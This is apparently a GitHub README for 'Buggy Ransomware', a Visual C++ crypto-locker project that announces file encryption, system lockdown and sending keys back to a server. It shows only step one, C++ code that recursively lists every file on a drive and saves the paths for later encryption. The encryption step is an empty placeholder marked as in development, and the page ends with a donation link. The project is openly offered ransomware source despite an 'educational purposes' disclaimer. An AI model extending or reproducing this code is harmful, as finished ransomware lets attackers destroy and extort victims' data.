#### DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.

<img src="logor.png" alt="logo">

# Buggy Ransomware

Buggy Ransomware is open source  Crypto-Locker. Buggy Ransomware is developed in Visual C++. It has features encrypt all file, lock down the system and send keys back to the server. Multi-threaded functionality helps to this tool make encryption faster.


## Step 1 (Fetch files)

Getting all files from all drive to encrypting them.

Here is Visual C++ program get all list directory & files in drive and store path in text file for encryption later use.

```
#include <boost/config/warning_disable.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include <iterator>

using namespace std;

fstream data_file("data.txt", ios::out);

int main(int argc, char* argv[]) {
	boost::system::error_code dir_error;

	for (boost::filesystem::recursive_directory_iterator end, dir("d:\\", dir_error); dir != end; dir.increment(dir_error)) {
		if (dir_error.value()) {
			cerr << "Error accessing file: " << dir_error.message() << endl;
		}
		else {
			cout << dir->path() << endl;
			data_file << dir->path() << "\n";
		}
	}
	system("pause");
	return 0;
}
```

## Step 2 (Encrypt files)

```
```

# Currently in Development....Happy Hacking:)

## Authors

Ajay Randhawa

## Donate
If you appreciate that, please consider donating to the Developer.

[![Donate](https://cdn.pbrd.co/images/HyQFKkP.png)](https://www.paypal.me/ajayrandhawa) 

